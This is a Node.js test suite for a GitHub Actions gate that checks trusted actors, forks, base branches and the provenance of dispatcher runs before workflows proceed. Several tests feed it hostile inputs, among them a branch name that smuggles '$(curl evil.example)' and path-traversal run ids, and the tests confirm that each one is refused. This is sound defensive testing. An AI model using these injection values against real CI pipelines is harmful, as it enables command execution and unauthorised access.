import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, test } from "node:test";
import { fileURLToPath } from "node:url";

import { readOutputs } from "../check-kill-switch/fixtures/read-outputs.mjs";
import { commitPulls as readCommitPulls, createGitHub, GitHubError, loadTrustedActors, main } from "./check-trusted-trigger.mjs";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FIXTURES = path.join(HERE, "fixtures");
const SCRIPT = path.join(HERE, "check-trusted-trigger.mjs");
const REPOSITORY = "melodic-software/claude-code-plugins";
const LIST = path.join(FIXTURES, "trusted-actors.json");
const HEAD_SHA = "1111111111111111111111111111111111111111";
const BASE_SHA = "2222222222222222222222222222222222222222";
const STRANGER = { login: "stranger", id: 9999001, type: "User" };
const OWN_RUN_ID = "39000000001";
const OWN_ROUTE = `GET /repos/${REPOSITORY}/actions/runs/${OWN_RUN_ID}`;
// The account each triggering-actor login in these tests stands for.
const USERS = {
  "kyle-sexton": { login: "kyle-sexton", id: 153232337, type: "User" },
  stranger: STRANGER,
  "claude[bot]": { login: "claude[bot]", id: 209825114, type: "Bot" },
  "melodic-automation-lanes[bot]": { login: "melodic-automation-lanes[bot]", id: 337595936, type: "Bot" },
  "github-actions[bot]": { login: "github-actions[bot]", id: 41898282, type: "Bot" },
  "github-merge-queue[bot]": { login: "github-merge-queue[bot]", id: 118344674, type: "Bot" },
};
// A listed login now held by another account.
const IMPOSTOR = { login: "kyle-sexton", id: 9999002, type: "User" };

const fixture = (name) => JSON.parse(readFileSync(path.join(FIXTURES, name), "utf8"));

// The fixture PR's branch ref, which a workflow_dispatch gate reads to confirm
// the PR's head; unless a test routes it, it points at HEAD_SHA.
const HEAD_REF_ROUTE = `GET /repos/${REPOSITORY}/git/ref/heads/feat/lane-probe`;
const HEAD_REF_AT = { ref: "refs/heads/feat/lane-probe", object: { sha: HEAD_SHA, type: "commit" } };

function fakeGitHub(routes) {
  const calls = [];
  const github = async (method, apiPath) => {
    calls.push(`${method} ${apiPath}`);
    const key = `${method} ${apiPath}`;
    if (key === HEAD_REF_ROUTE && !(key in routes)) {
      return structuredClone(HEAD_REF_AT);
    }
    if (!(key in routes)) {
      throw new GitHubError(404, key);
    }
    const value = typeof routes[key] === "function" ? routes[key]() : routes[key];
    if (value instanceof GitHubError) {
      throw value;
    }
    return structuredClone(value);
  };
  github.calls = calls;
  github.routes = routes;
  return github;
}

// A route that answers each read with the next value, repeating the last.
function inTurn(...values) {
  let read = 0;
  return () => values[Math.min(read++, values.length - 1)];
}

// Records each wait instead of waiting.
function fakeSleep() {
  const waits = [];
  const sleep = async (ms) => {
    waits.push(ms);
  };
  sleep.waits = waits;
  return sleep;
}

let dir;
beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), "trusted-trigger-"));
});
afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

function writeJson(name, value) {
  const file = path.join(dir, name);
  writeFileSync(file, typeof value === "string" ? value : JSON.stringify(value));
  return file;
}

async function gate({
  eventName,
  event,
  github = fakeGitHub({}),
  list = LIST,
  prNumber = "",
  deniedActorIds = "",
  triggeringActor = "kyle-sexton",
  dispatcherRunId,
  dispatcherWorkflow,
  runDispatcherWorkflow,
  runDispatcherUpstreams,
  expectedUpstreamHead,
  lanesAppId,
  requirePr,
  runId = OWN_RUN_ID,
  dispatchedWorkflow,
  requireKind,
  appLabel,
  reconcilerWorkflow,
  runAttempt = "1",
  rerunner = USERS[triggeringActor.toLowerCase()],
  ownRun,
  sleep = fakeSleep(),
  attemptTimeoutMs,
}) {
  const outputPath = writeJson("output", "");
  // This run's own record, unless the test routes it: the re-runner is read
  // from its triggering_actor, by default the user triggeringActor names.
  const ownRoute = `GET /repos/${REPOSITORY}/actions/runs/${runId}`;
  const record = ownRun !== undefined ? ownRun : { id: Number(runId), run_attempt: Number(runAttempt), triggering_actor: rerunner };
  const withOwnRun = async (method, apiPath, ...rest) => {
    const key = `${method} ${apiPath}`;
    if (key !== ownRoute || key in (github.routes ?? {})) {
      return github(method, apiPath, ...rest);
    }
    github.calls?.push(key);
    if (record instanceof GitHubError) {
      throw record;
    }
    return structuredClone(record);
  };
  await main({
    env: {
      EVENT_NAME: eventName,
      EVENT_PATH: writeJson("event.json", event),
      TRUSTED_ACTORS_PATH: list,
      PR_NUMBER: prNumber,
      DENIED_ACTOR_IDS: deniedActorIds,
      TRIGGERING_ACTOR: triggeringActor,
      REPOSITORY,
      GITHUB_OUTPUT: outputPath,
      ...(dispatcherRunId === undefined ? {} : { DISPATCHER_RUN_ID: dispatcherRunId }),
      ...(dispatcherWorkflow === undefined ? {} : { DISPATCHER_WORKFLOW: dispatcherWorkflow }),
      ...(runDispatcherWorkflow === undefined
        ? {}
        : { RUN_DISPATCHER_WORKFLOW: runDispatcherWorkflow }),
      ...(runDispatcherUpstreams === undefined
        ? {}
        : { RUN_DISPATCHER_UPSTREAMS: runDispatcherUpstreams }),
      ...(expectedUpstreamHead === undefined ? {} : { EXPECTED_UPSTREAM_HEAD: expectedUpstreamHead }),
      ...(lanesAppId === undefined ? {} : { LANES_APP_ID: lanesAppId }),
      ...(requirePr === undefined ? {} : { REQUIRE_PR: requirePr }),
      ...(runId === undefined ? {} : { GITHUB_RUN_ID: runId }),
      ...(dispatchedWorkflow === undefined ? {} : { DISPATCHED_WORKFLOW: dispatchedWorkflow }),
      ...(requireKind === undefined ? {} : { REQUIRE_KIND: requireKind }),
      ...(appLabel === undefined ? {} : { APP_LABEL: appLabel }),
      ...(reconcilerWorkflow === undefined ? {} : { RECONCILER_WORKFLOW: reconcilerWorkflow }),
      ...(runAttempt === undefined ? {} : { GITHUB_RUN_ATTEMPT: runAttempt }),
    },
    github: withOwnRun,
    sleep,
    attemptTimeoutMs,
  });
  return readOutputs(readFileSync(outputPath, "utf8"));
}

const STOPPED = (reason) => ({
  proceed: "false",
  reason,
  "pr-number": "",
  "head-ref": "",
  "head-sha": "",
  "base-sha": "",
});
const PROCEED = {
  proceed: "true",
  reason: "ok",
  "pr-number": "42",
  "head-ref": "feat/lane-probe",
  "head-sha": HEAD_SHA,
  "base-sha": BASE_SHA,
};

// pull_request

test("pull_request: same-repo PR from a listed author and actor proceeds", async () => {
  assert.deepEqual(
    await gate({ eventName: "pull_request", event: fixture("event-pull-request.json") }),
    PROCEED,
  );
});

test("pull_request: a fork PR stops with fork", async () => {
  const event = fixture("event-pull-request.json");
  event.pull_request.head.repo.full_name = "stranger/claude-code-plugins";
  event.pull_request.head.repo.fork = true;
  assert.deepEqual(await gate({ eventName: "pull_request", event }), STOPPED("fork"));
});

test("pull_request: a null head repo counts as a fork", async () => {
  const event = fixture("event-pull-request.json");
  event.pull_request.head.repo = null;
  assert.deepEqual(await gate({ eventName: "pull_request", event }), STOPPED("fork"));
});

test("pull_request: an unlisted actor stops with untrusted-actor", async () => {
  const event = fixture("event-pull-request.json");
  event.sender = STRANGER;
  assert.deepEqual(await gate({ eventName: "pull_request", event }), STOPPED("untrusted-actor"));
});

test("pull_request: an unlisted PR author stops with untrusted-author", async () => {
  const event = fixture("event-pull-request.json");
  event.pull_request.user = STRANGER;
  assert.deepEqual(await gate({ eventName: "pull_request", event }), STOPPED("untrusted-author"));
});

test("pull_request: a listed login under a different id is not trusted", async () => {
  const event = fixture("event-pull-request.json");
  event.sender = { login: "kyle-sexton", id: 123, type: "User" };
  assert.deepEqual(await gate({ eventName: "pull_request", event }), STOPPED("untrusted-actor"));
});

test("pull_request: a head ref with shell syntax stops with no-pr", async () => {
  const event = fixture("event-pull-request.json");
  event.pull_request.head.ref = "feat/$(curl evil.example)";
  assert.deepEqual(await gate({ eventName: "pull_request", event }), STOPPED("no-pr"));
});

test("pull_request: a renamed login keeps trust through its listed id", async () => {
  const event = fixture("event-pull-request.json");
  event.sender.login = "kyle-renamed";
  event.pull_request.user.login = "kyle-renamed";
  assert.deepEqual(await gate({ eventName: "pull_request", event }), PROCEED);
});

// workflow_dispatch

test("workflow_dispatch: resolves the head ref of a same-repo PR by fetching it", async () => {
  const github = fakeGitHub({
    [`GET /repos/${REPOSITORY}/pulls/42`]: fixture("api-pull-42.json"),
  });
  const outputs = await gate({
    eventName: "workflow_dispatch",
    event: fixture("event-workflow-dispatch.json"),
    github,
    prNumber: "42",
  });
  assert.deepEqual(outputs, PROCEED);
  assert.deepEqual(github.calls, [`GET /repos/${REPOSITORY}/pulls/42`, HEAD_REF_ROUTE, OWN_ROUTE]);
});

test("workflow_dispatch: a fetched PR with a null head repo counts as a fork", async () => {
  const pull = fixture("api-pull-42.json");
  pull.head.repo = null;
  const github = fakeGitHub({ [`GET /repos/${REPOSITORY}/pulls/42`]: pull });
  assert.deepEqual(
    await gate({
      eventName: "workflow_dispatch",
      event: fixture("event-workflow-dispatch.json"),
      github,
      prNumber: "42",
    }),
    STOPPED("fork"),
  );
});

test("workflow_dispatch: a fork PR stops with fork without reading its branch or waiting", async () => {
  const pull = fixture("api-pull-42.json");
  pull.head.repo = { id: 2, full_name: "stranger/claude-code-plugins", fork: true };
  const github = fakeGitHub({ [`GET /repos/${REPOSITORY}/pulls/42`]: pull });
  const sleep = fakeSleep();
  assert.deepEqual(
    await gate({
      eventName: "workflow_dispatch",
      event: fixture("event-workflow-dispatch.json"),
      github,
      prNumber: "42",
      sleep,
    }),
    STOPPED("fork"),
  );
  assert.deepEqual(github.calls, [`GET /repos/${REPOSITORY}/pulls/42`]);
  assert.deepEqual(sleep.waits, []);
});

test("workflow_dispatch: no PR number stops with no-pr", async () => {
  assert.deepEqual(
    await gate({ eventName: "workflow_dispatch", event: fixture("event-workflow-dispatch.json") }),
    STOPPED("no-pr"),
  );
});

test("workflow_dispatch: a PR number that is not a positive integer stops before any request", async () => {
  const github = fakeGitHub({});
  assert.deepEqual(
    await gate({
      eventName: "workflow_dispatch",
      event: fixture("event-workflow-dispatch.json"),
      github,
      prNumber: "42/../../user",
    }),
    STOPPED("no-pr"),
  );
  assert.deepEqual(github.calls, []);
});

test("workflow_dispatch: a PR that cannot be fetched stops with no-pr", async () => {
  assert.deepEqual(
    await gate({
      eventName: "workflow_dispatch",
      event: fixture("event-workflow-dispatch.json"),
      prNumber: "42",
    }),
    STOPPED("no-pr"),
  );
});

test("workflow_dispatch: an unlisted dispatcher stops with untrusted-actor", async () => {
  const event = fixture("event-workflow-dispatch.json");
  event.sender = STRANGER;
  const github = fakeGitHub({
    [`GET /repos/${REPOSITORY}/pulls/42`]: fixture("api-pull-42.json"),
  });
  assert.deepEqual(
    await gate({ eventName: "workflow_dispatch", event, github, prNumber: "42" }),
    STOPPED("untrusted-actor"),
  );
});

// workflow_run

const commitPulls = `GET /repos/${REPOSITORY}/commits/${HEAD_SHA}/pulls`;

test("workflow_run: empty pull_requests still resolves a same-repo PR by fetching", async () => {
  const github = fakeGitHub({ [commitPulls]: [fixture("api-pull-42.json")] });
  assert.deepEqual(
    await gate({ eventName: "workflow_run", event: fixture("event-workflow-run.json"), github }),
    PROCEED,
  );
});

// The GraphQL answer for api-pull-42.json's pull request, as
// repository.object(oid).associatedPullRequests returns it.
const GRAPHQL_PULL_42 = {
  number: 42,
  state: "OPEN",
  isDraft: false,
  headRefName: "feat/lane-probe",
  headRefOid: HEAD_SHA,
  baseRefName: "main",
  baseRefOid: "2222222222222222222222222222222222222222",
  headRepository: { nameWithOwner: REPOSITORY },
  author: { __typename: "User", login: "kyle-sexton", databaseId: 153232337 },
  labels: { nodes: [], pageInfo: { hasNextPage: false } },
};
const associated = (...nodes) => ({
  data: { repository: { object: { associatedPullRequests: { nodes, pageInfo: { hasNextPage: false } } } } },
});

test("workflow_run: a commit pulls read that fails falls back to the commit's GraphQL pull requests", async () => {
  const github = fakeGitHub({
    [commitPulls]: new GitHubError(500, commitPulls),
    "POST /graphql": associated(GRAPHQL_PULL_42, { ...GRAPHQL_PULL_42, number: 7, state: "MERGED" }),
  });
  assert.deepEqual(
    await gate({ eventName: "workflow_run", event: fixture("event-workflow-run.json"), github }),
    PROCEED,
  );
  assert.deepEqual(github.calls.slice(0, 2), [commitPulls, "POST /graphql"]);
});

test("workflow_run: a GraphQL fallback with no open pull request stops with no-pr", async () => {
  const github = fakeGitHub({
    [commitPulls]: new GitHubError(500, commitPulls),
    "POST /graphql": associated({ ...GRAPHQL_PULL_42, state: "CLOSED" }),
  });
  assert.deepEqual(
    await gate({ eventName: "workflow_run", event: fixture("event-workflow-run.json"), github }),
    STOPPED("no-pr"),
  );
});

// The fallback is a read sent as a POST, so it gets the GET attempt timeout
// itself; scaled down to 5 ms here. Without it the read hangs and the test
// times out.
test("workflow_run: a hung GraphQL fallback is aborted at the attempt timeout and stops with no-pr", { timeout: 5000 }, async () => {
  const base = fakeGitHub({ [commitPulls]: new GitHubError(500, commitPulls) });
  const github = async (method, apiPath, body, headers, options) => {
    if (method !== "POST" || apiPath !== "/graphql") {
      return base(method, apiPath, body, headers);
    }
    base.calls.push(`${method} ${apiPath}`);
    return new Promise((_, reject) => options?.signal?.addEventListener("abort", () => reject(options.signal.reason)));
  };
  github.calls = base.calls;
  github.routes = base.routes;
  assert.deepEqual(
    await gate({ eventName: "workflow_run", event: fixture("event-workflow-run.json"), github, attemptTimeoutMs: 5 }),
    STOPPED("no-pr"),
  );
  assert.deepEqual(base.calls.slice(0, 2), [commitPulls, "POST /graphql"]);
});

test("workflow_run: a fork head_repository stops with fork before any request", async () => {
  const event = fixture("event-workflow-run.json");
  event.workflow_run.head_repository.full_name = "stranger/claude-code-plugins";
  const github = fakeGitHub({ [commitPulls]: [fixture("api-pull-42.json")] });
  assert.deepEqual(await gate({ eventName: "workflow_run", event, github }), STOPPED("fork"));
  assert.deepEqual(github.calls, []);
});

test("workflow_run: a run with no associated open PR stops with no-pr", async () => {
  const github = fakeGitHub({ [commitPulls]: [] });
  assert.deepEqual(
    await gate({ eventName: "workflow_run", event: fixture("event-workflow-run.json"), github }),
    STOPPED("no-pr"),
  );
});

test("workflow_run: a PR whose head moved past the run's SHA stops with no-pr", async () => {
  const moved = fixture("api-pull-42.json");
  moved.head.sha = "3333333333333333333333333333333333333333";
  const github = fakeGitHub({ [commitPulls]: [moved] });
  assert.deepEqual(
    await gate({ eventName: "workflow_run", event: fixture("event-workflow-run.json"), github }),
    STOPPED("no-pr"),
  );
});

test("workflow_run: two open same-repo PRs on the SHA are ambiguous and stop with no-pr", async () => {
  const second = fixture("api-pull-42.json");
  second.number = 43;
  const github = fakeGitHub({ [commitPulls]: [fixture("api-pull-42.json"), second] });
  assert.deepEqual(
    await gate({ eventName: "workflow_run", event: fixture("event-workflow-run.json"), github }),
    STOPPED("no-pr"),
  );
});

test("workflow_run: an unlisted actor of the failed run stops with untrusted-actor", async () => {
  const event = fixture("event-workflow-run.json");
  event.workflow_run.triggering_actor = STRANGER;
  const github = fakeGitHub({ [commitPulls]: [fixture("api-pull-42.json")] });
  assert.deepEqual(
    await gate({ eventName: "workflow_run", event, github }),
    STOPPED("untrusted-actor"),
  );
});

// Base branch: lanes read the list and scripts from the base, and only the
// default branch is a trusted base.

test("pull_request: a PR stacked on a non-default branch stops with untrusted-base", async () => {
  const event = fixture("event-pull-request.json");
  event.repository.default_branch = "main";
  event.pull_request.base.ref = "feat/stack-parent";
  assert.deepEqual(await gate({ eventName: "pull_request", event }), STOPPED("untrusted-base"));
});

test("pull_request: a PR into a default branch not named main proceeds", async () => {
  const event = fixture("event-pull-request.json");
  event.repository.default_branch = "trunk";
  event.pull_request.base.ref = "trunk";
  assert.deepEqual(await gate({ eventName: "pull_request", event }), PROCEED);
});

test("pull_request: a payload with no default branch stops with untrusted-base", async () => {
  const event = fixture("event-pull-request.json");
  delete event.repository.default_branch;
  assert.deepEqual(await gate({ eventName: "pull_request", event }), STOPPED("untrusted-base"));
});

test("workflow_dispatch: a fetched PR on a non-default base stops with untrusted-base", async () => {
  const event = fixture("event-workflow-dispatch.json");
  event.repository.default_branch = "main";
  const pull = fixture("api-pull-42.json");
  pull.base.ref = "feat/stack-parent";
  const github = fakeGitHub({ [`GET /repos/${REPOSITORY}/pulls/42`]: pull });
  assert.deepEqual(
    await gate({ eventName: "workflow_dispatch", event, github, prNumber: "42" }),
    STOPPED("untrusted-base"),
  );
});

test("workflow_run: a PR on a non-default base stops with untrusted-base", async () => {
  const event = fixture("event-workflow-run.json");
  event.repository.default_branch = "main";
  const pull = fixture("api-pull-42.json");
  pull.base.ref = "feat/stack-parent";
  const github = fakeGitHub({ [commitPulls]: [pull] });
  assert.deepEqual(await gate({ eventName: "workflow_run", event, github }), STOPPED("untrusted-base"));
});

// workflow_dispatch sent by github-actions[bot] with a dispatcher run (probe row R-ACT)

const DISPATCHER_RUN_ID = "38155572048";
const SELF_RUN_ID = "38155580529";
const DISPATCHER_WORKFLOW = ".github/workflows/pr-unblock-dispatch.yml";
const DISPATCHER_HEAD = "4444444444444444444444444444444444444444";
const pullRoute = `GET /repos/${REPOSITORY}/pulls/42`;
const dispatcherRoute = `GET /repos/${REPOSITORY}/actions/runs/${DISPATCHER_RUN_ID}`;
const selfRoute = `GET /repos/${REPOSITORY}/actions/runs/${SELF_RUN_ID}`;
const DISPATCHED_WORKFLOW = ".github/workflows/pr-unblock.yml";
const TIP_SHA = "5555555555555555555555555555555555555555";
const tipRoute = `GET /repos/${REPOSITORY}/git/ref/heads/main`;
const tagRoute = `GET /repos/${REPOSITORY}/git/ref/tags/main`;
const compareRoute = `GET /repos/${REPOSITORY}/compare/${DISPATCHER_HEAD}...${TIP_SHA}`;
const ACTIONS_BOT = { login: "github-actions[bot]", id: 41898282, type: "Bot" };
const KYLE = { login: "kyle-sexton", id: 153232337, type: "User" };
const TIP_REF = { ref: "refs/heads/main", object: { sha: TIP_SHA, type: "commit" } };

const artifactsRoute = `${dispatcherRoute}/artifacts?per_page=100`;
// The fixture's one artifact is the dispatcher run's record of this run.
const RECORD = fixture("api-run-dispatcher-artifacts.json").artifacts[0];
const listing = (...artifacts) => ({ total_count: artifacts.length, artifacts });
const record = (overrides = {}) => ({ ...RECORD, ...overrides });

// No tagRoute: the fake answers 404, so no tag shares the branch name.
function dispatcherRoutes({
  dispatcher = {},
  self = {},
  compare = { status: "ahead" },
  tip = TIP_REF,
  artifacts = listing(record()),
} = {}) {
  return {
    [pullRoute]: fixture("api-pull-42.json"),
    [dispatcherRoute]:
      typeof dispatcher === "function"
        ? dispatcher
        : { ...fixture("api-run-dispatcher.json"), ...dispatcher },
    [selfRoute]: { ...fixture("api-run-self.json"), ...self },
    [tipRoute]: tip,
    [compareRoute]: compare,
    [artifactsRoute]: artifacts,
  };
}

// The dispatcher run as each read sees it: the window check's read first, then
// one per record read.
const dispatcherIn = (...statuses) =>
  inTurn(...statuses.map((status) => ({ ...fixture("api-run-dispatcher.json"), status })));

function dispatched({ github, event = fixture("event-workflow-dispatch-dispatcher.json"), ...rest }) {
  return gate({
    eventName: "workflow_dispatch",
    event,
    github,
    prNumber: "42",
    triggeringActor: "github-actions[bot]",
    dispatcherRunId: DISPATCHER_RUN_ID,
    dispatcherWorkflow: DISPATCHER_WORKFLOW,
    dispatchedWorkflow: DISPATCHED_WORKFLOW,
    runId: SELF_RUN_ID,
    ...rest,
  });
}

test("dispatcher: a run created inside a push dispatcher run's window proceeds", async () => {
  const github = fakeGitHub(dispatcherRoutes());
  assert.deepEqual(await dispatched({ github }), PROCEED);
  assert.deepEqual(
    [...github.calls].sort(),
    [
      artifactsRoute,
      compareRoute,
      dispatcherRoute,
      dispatcherRoute,
      pullRoute,
      HEAD_REF_ROUTE,
      selfRoute,
      tagRoute,
      tipRoute,
    ].sort(),
  );
});

test("dispatcher: the window closes ten minutes after the dispatcher run started", async () => {
  const long = { updated_at: "2026-10-11T12:30:00Z" };
  const edge = fakeGitHub(
    dispatcherRoutes({ dispatcher: long, self: { created_at: "2026-10-11T12:10:05Z" } }),
  );
  assert.deepEqual(await dispatched({ github: edge }), PROCEED);
  const late = fakeGitHub(
    dispatcherRoutes({ dispatcher: long, self: { created_at: "2026-10-11T12:10:06Z" } }),
  );
  assert.deepEqual(await dispatched({ github: late }), STOPPED("untrusted-actor"));
});

for (const [label, overrides] of [
  ["this run's path is another workflow", { self: { path: ".github/workflows/pr-refine.yml" } }],
  ["this run's event is not workflow_dispatch", { self: { event: "push" } }],
  ["the tip ref resolves to another ref", {
    tip: { ...TIP_REF, ref: "refs/heads/main-old" },
  }],
]) {
  test(`dispatcher: refused with untrusted-actor when ${label}`, async () => {
    const github = fakeGitHub(dispatcherRoutes(overrides));
    assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-actor"));
  });
}

test("dispatcher: an empty dispatched-workflow stops even against a run with an empty path", async () => {
  const github = fakeGitHub(dispatcherRoutes({ self: { path: "" } }));
  assert.deepEqual(
    await dispatched({ github, dispatchedWorkflow: "" }),
    STOPPED("untrusted-actor"),
  );
});

test("dispatcher: a tag sharing the default branch name stops with untrusted-actor", async () => {
  const github = fakeGitHub({
    ...dispatcherRoutes(),
    [tagRoute]: { ref: "refs/tags/main", object: { sha: DISPATCHER_HEAD, type: "commit" } },
  });
  assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-actor"));
});

test("dispatcher: a tag lookup that fails other than 404 stops with untrusted-actor", async () => {
  const github = fakeGitHub({ ...dispatcherRoutes(), [tagRoute]: new GitHubError(500, "tag") });
  assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-actor"));
});

test("dispatcher: a tip ref without a commit SHA stops before the compare", async () => {
  const github = fakeGitHub({
    ...dispatcherRoutes({ tip: { ...TIP_REF, object: { sha: "main" } } }),
    [`GET /repos/${REPOSITORY}/compare/${DISPATCHER_HEAD}...main`]: { status: "ahead" },
  });
  assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-actor"));
  assert.ok(!github.calls.some((call) => call.includes("/compare/")));
});

test("dispatcher: a failed tip ref read stops with untrusted-actor", async () => {
  const all = dispatcherRoutes();
  delete all[tipRoute];
  assert.deepEqual(await dispatched({ github: fakeGitHub(all) }), STOPPED("untrusted-actor"));
});

for (const [label, ref] of [
  ["a tag ref", "refs/tags/main"],
  ["another branch", "refs/heads/feat/x"],
  ["no ref", undefined],
]) {
  test(`dispatcher: this run dispatched on ${label} stops with untrusted-actor`, async () => {
    const event = fixture("event-workflow-dispatch-dispatcher.json");
    if (ref === undefined) {
      delete event.ref;
    } else {
      event.ref = ref;
    }
    const github = fakeGitHub(dispatcherRoutes());
    assert.deepEqual(await dispatched({ github, event }), STOPPED("untrusted-actor"));
  });
}

test("dispatcher: a dispatcher run that has since completed still proceeds", async () => {
  const github = fakeGitHub(
    dispatcherRoutes({ dispatcher: { status: "completed", conclusion: "success" } }),
  );
  assert.deepEqual(await dispatched({ github }), PROCEED);
});

test("dispatcher: a run that queued past the window before the gate proceeds on its created_at", async () => {
  const github = fakeGitHub(
    dispatcherRoutes({
      self: { run_started_at: "2026-10-11T13:30:00Z", updated_at: "2026-10-11T13:30:00Z" },
    }),
  );
  assert.deepEqual(await dispatched({ github }), PROCEED);
});

test("dispatcher: created_at on either edge of the window proceeds", async () => {
  for (const created of ["2026-10-11T12:00:05Z", "2026-10-11T12:05:00Z"]) {
    const github = fakeGitHub(dispatcherRoutes({ self: { created_at: created } }));
    assert.deepEqual(await dispatched({ github }), PROCEED, created);
  }
});

test("dispatcher: compare status identical (the dispatcher ran on the tip) proceeds", async () => {
  const github = fakeGitHub(dispatcherRoutes({ compare: { status: "identical" } }));
  assert.deepEqual(await dispatched({ github }), PROCEED);
});

test("dispatcher: a dispatcher run a listed human dispatched proceeds", async () => {
  const github = fakeGitHub(
    dispatcherRoutes({
      dispatcher: { event: "workflow_dispatch", actor: KYLE, triggering_actor: KYLE },
    }),
  );
  assert.deepEqual(await dispatched({ github }), PROCEED);
});

// A scheduled run's actor is whoever last edited the cron, so, as for push, it
// is not checked.
test("dispatcher: a scheduled dispatcher run on the default branch proceeds", async () => {
  const github = fakeGitHub(
    dispatcherRoutes({
      dispatcher: { event: "schedule", actor: STRANGER, triggering_actor: STRANGER },
    }),
  );
  assert.deepEqual(await dispatched({ github }), PROCEED);
});

for (const [label, overrides] of [
  ["created before the dispatcher run started", { self: { created_at: "2026-10-11T12:00:04Z" } }],
  ["created after the dispatcher run's updated_at", { self: { created_at: "2026-10-11T12:05:01Z" } }],
  ["the run's path is another workflow", { dispatcher: { path: ".github/workflows/ci.yml" } }],
  ["the run's path names the workflow at another ref", {
    dispatcher: { path: `${DISPATCHER_WORKFLOW}@refs/heads/feat/x` },
  }],
  ["the run's branch is not the default branch", { dispatcher: { head_branch: "feat/forged" } }],
  ["the run's event is schedule on another branch", {
    dispatcher: { event: "schedule", head_branch: "feat/forged" },
  }],
  ["the run's event is schedule from another workflow", {
    dispatcher: { event: "schedule", path: ".github/workflows/ci.yml" },
  }],
  ["the run's event is pull_request, even with a listed human actor", {
    dispatcher: { event: "pull_request", actor: KYLE, triggering_actor: KYLE },
  }],
  ["an unlisted user dispatched the dispatcher run", {
    dispatcher: { event: "workflow_dispatch", actor: STRANGER, triggering_actor: STRANGER },
  }],
  ["github-actions[bot] dispatched the dispatcher run", {
    dispatcher: { event: "workflow_dispatch", actor: ACTIONS_BOT, triggering_actor: ACTIONS_BOT },
  }],
  ["the run's head_sha is not an ancestor of the tip (diverged)", { compare: { status: "diverged" } }],
  ["the run's head_sha is ahead of the tip (behind)", { compare: { status: "behind" } }],
  ["the run belongs to another repository", {
    dispatcher: { repository: { id: 2, full_name: "stranger/claude-code-plugins" } },
  }],
  ["the run_attempt > 1 re-run was triggered by an unlisted user", {
    dispatcher: { run_attempt: 2, triggering_actor: STRANGER },
  }],
  ["the run_attempt > 1 re-run was triggered by a listed bot, not a human", {
    dispatcher: {
      run_attempt: 2,
      triggering_actor: { login: "claude[bot]", id: 209825114, type: "Bot" },
    },
  }],
  ["the run_attempt > 1 re-run has no triggering_actor", {
    dispatcher: { run_attempt: 2, triggering_actor: null },
  }],
  ["the dispatcher run has no run_started_at", { dispatcher: { run_started_at: null } }],
  ["the dispatcher run has an unparsable updated_at", { dispatcher: { updated_at: "soon" } }],
  ["the dispatcher run has no run_attempt", { dispatcher: { run_attempt: null } }],
  ["this run has no created_at", { self: { created_at: null } }],
]) {
  test(`dispatcher: refused with untrusted-actor when ${label}`, async () => {
    const github = fakeGitHub(dispatcherRoutes(overrides));
    assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-actor"));
  });
}

test("dispatcher: a run_attempt > 1 re-run by a listed human proceeds", async () => {
  const github = fakeGitHub(
    dispatcherRoutes({ dispatcher: { run_attempt: 2, triggering_actor: KYLE } }),
  );
  assert.deepEqual(await dispatched({ github }), PROCEED);
});

for (const [label, routes] of [
  ["the dispatcher run read", dispatcherRoute],
  ["this run's own read", selfRoute],
  ["the ancestor compare", compareRoute],
]) {
  test(`dispatcher: a failed ${label} stops with untrusted-actor`, async () => {
    const all = dispatcherRoutes();
    delete all[routes];
    assert.deepEqual(await dispatched({ github: fakeGitHub(all) }), STOPPED("untrusted-actor"));
  });
}

test("dispatcher: a bot sender with no dispatcher run id keeps today's untrusted-actor", async () => {
  const github = fakeGitHub(dispatcherRoutes());
  assert.deepEqual(await dispatched({ github, dispatcherRunId: "" }), STOPPED("untrusted-actor"));
  assert.deepEqual(github.calls, [pullRoute, HEAD_REF_ROUTE]);
});

test("dispatcher: a malformed dispatcher run id stops before any run read", async () => {
  const github = fakeGitHub(dispatcherRoutes());
  assert.deepEqual(
    await dispatched({ github, dispatcherRunId: `${DISPATCHER_RUN_ID}/../../pulls/1` }),
    STOPPED("untrusted-actor"),
  );
  assert.deepEqual(github.calls, [pullRoute, HEAD_REF_ROUTE]);
});

test("dispatcher: a head_sha that is not a SHA stops before the compare", async () => {
  const github = fakeGitHub({
    ...dispatcherRoutes({ dispatcher: { head_sha: "main" } }),
    [`GET /repos/${REPOSITORY}/compare/main...${TIP_SHA}`]: { status: "ahead" },
  });
  assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-actor"));
  assert.ok(!github.calls.some((call) => call.includes("/compare/")));
});

test("dispatcher: an empty dispatcher-workflow stops even against a run with an empty path", async () => {
  const github = fakeGitHub(dispatcherRoutes({ dispatcher: { path: "" } }));
  assert.deepEqual(
    await dispatched({ github, dispatcherWorkflow: "" }),
    STOPPED("untrusted-actor"),
  );
});

test("dispatcher: a malformed own run id stops with untrusted-actor", async () => {
  const github = fakeGitHub(dispatcherRoutes());
  assert.deepEqual(await dispatched({ github, runId: "" }), STOPPED("untrusted-actor"));
});

test("dispatcher: a payload without the default branch stops with untrusted-base", async () => {
  const event = fixture("event-workflow-dispatch-dispatcher.json");
  delete event.repository.default_branch;
  const github = fakeGitHub(dispatcherRoutes());
  assert.deepEqual(await dispatched({ github, event }), STOPPED("untrusted-base"));
});

test("dispatcher: a sender named github-actions[bot] under another id is not the dispatcher bot", async () => {
  const event = fixture("event-workflow-dispatch-dispatcher.json");
  event.sender = { ...ACTIONS_BOT, id: 41898283 };
  const github = fakeGitHub(dispatcherRoutes());
  assert.deepEqual(await dispatched({ github, event }), STOPPED("untrusted-actor"));
  assert.deepEqual(github.calls, [pullRoute, HEAD_REF_ROUTE]);
});

test("dispatcher: the dispatcher check is skipped for a listed human sender", async () => {
  const event = fixture("event-workflow-dispatch-dispatcher.json");
  event.sender = KYLE;
  const github = fakeGitHub(dispatcherRoutes({ self: { triggering_actor: KYLE } }));
  assert.deepEqual(await dispatched({ github, event, triggeringActor: "kyle-sexton" }), PROCEED);
  assert.deepEqual(github.calls, [pullRoute, HEAD_REF_ROUTE, selfRoute]);
});

